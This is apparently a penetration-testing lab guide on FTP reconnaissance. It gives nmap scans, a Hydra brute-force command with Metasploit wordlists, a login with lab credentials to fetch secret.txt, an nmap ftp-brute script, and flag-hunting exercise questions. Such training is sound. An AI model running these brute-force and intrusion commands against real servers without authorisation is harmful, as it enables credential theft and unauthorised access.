# FTP (File Transfer Protocol)

# FTP Server Reconnaissance Basics: A Step-by-Step Guide

This guide provides various commands to FTP reconnaisance basics.

### 1. Ping Command

Checks if the target system is reachable:
`ping [target IP]`

### 2. Nmap Command

Performs a network scan to identify open ports and services:
`nmap [target IP]`

### 3. Detailed Nmap Scan

Scans the FTP port (port 21) and identifies the software and operating system:
`nmap [target IP] -p 21 -sV -O`
_Port 21 = default FTP port. Port runs ProFTP 1.3.5a, OS = Linux 2.6.32_

### 4. FTP Client

Connects to the FTP server of the target system:
`ftp [target IP]`

### 5. Hydra Command

Performs a brute-force attack to crack username and password:
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [target IP] ftp`
_Tries usernames and common passwords._

### 6. FTP Login and File Download

Logs in with the found credentials and downloads a file:
`ftp [target IP], sysadmin, 654321`
After login:
`ls`
`get secret.txt`

### 7. List Directory Contents

Displays the contents of the current directory:
`ls`

### 8. Display File Contents

Displays the contents of the downloaded file:
`cat secret.txt`

### 9. Nmap Brute-Force Script

Creates a file with the username and performs a brute-force attack with nmap:
`echo "sysadmin" > users`
`cat users`
`nmap [target IP] --script ftp-brute --script-args userdb=/root/users -p 21`


Questions

    1. What is the version of FTP server?
    2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/        unix_passwords.txt       to check if any of these credentials work on the system. List all found credentials.
    3. Find the password of user “sysadmin” using nmap script.
    4. Find seven flags hidden on the server.




